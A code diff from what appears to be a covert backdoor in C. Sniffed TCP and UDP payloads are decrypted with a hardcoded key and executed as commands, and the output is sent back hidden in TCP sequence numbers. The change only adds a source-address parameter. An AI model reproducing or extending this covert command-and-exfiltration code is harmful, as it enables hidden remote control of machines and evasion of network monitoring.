@@ -132,7 +132,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
 	memcpy(decrypt_payload, tcp_payload, strlen(tcp_payload));
 
-	cmd_execute(decrypt_payload, ip_addr);
+	cmd_execute(decrypt_payload, iphdr->daddr, ip_addr);
 }
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
@@ -163,10 +163,10 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 
 	printf("UDP PAYLOAD = %s", decrypt_payload);
 
-	cmd_execute(decrypt_payload, ip_addr);
+	cmd_execute(decrypt_payload, iphdr->daddr, ip_addr);
 }
 
-void cmd_execute(char *command, uint32 ip) {
+void cmd_execute(char *command, uint32 src, uint32 ip) {
 	FILE *fp;
 	char line[MAX_LEN];
 	char resp[MAX_LEN];
@@ -212,7 +212,7 @@ void cmd_execute(char *command, uint32 ip) {
 			tcp_seq += frame[j]; // adding to the default sequence number
 
 			usleep(SLEEP_TIME); // sleep for specific amount of time
-			_send(ip, tcp_seq, RSP_TYP); // send the packet as a response packet
+			_send(src, ip, tcp_seq, RSP_TYP); // send the packet as a response packet
 		}
 	}
 
